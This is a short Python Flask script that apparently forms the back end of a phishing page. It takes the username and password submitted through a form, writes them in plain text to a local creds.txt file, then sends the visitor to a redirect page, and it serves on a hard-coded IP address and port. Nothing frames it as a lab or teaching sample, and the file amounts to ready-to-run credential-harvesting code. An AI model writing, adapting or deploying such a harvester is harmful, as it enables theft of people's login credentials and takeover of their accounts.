from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route('/')
def my_form():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def my_form_post():
    username = request.form['username']
    password = request.form['password']
    with open('creds.txt', 'w') as f:
        f.write("""Username: """ + username + """
Password: """ + password)
        f.close()
    return render_template("redirect.html")

app.run(host="10.90.97.0", port="20458")